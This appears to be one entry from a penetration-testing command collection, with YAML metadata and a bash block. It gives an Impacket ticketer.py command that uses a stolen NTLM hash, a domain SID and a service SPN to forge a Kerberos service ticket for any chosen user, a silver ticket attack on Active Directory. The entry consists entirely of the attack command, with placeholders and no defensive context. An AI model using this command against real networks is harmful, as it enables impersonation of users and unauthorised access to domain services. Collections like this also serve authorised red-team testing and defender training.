---
id: 6e2598b4-ab89-4cc6-9e7c-b5f0cc2c9548
name: to generate the TGS with NTLM
type: command
executor: bash
data: 'python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>
  -spn <service_spn> <user_name>

  '
output: null
created_at: '2020-07-14T18:14:48.540061+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# to generate the TGS with NTLM

```bash
python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn> <user_name>

```
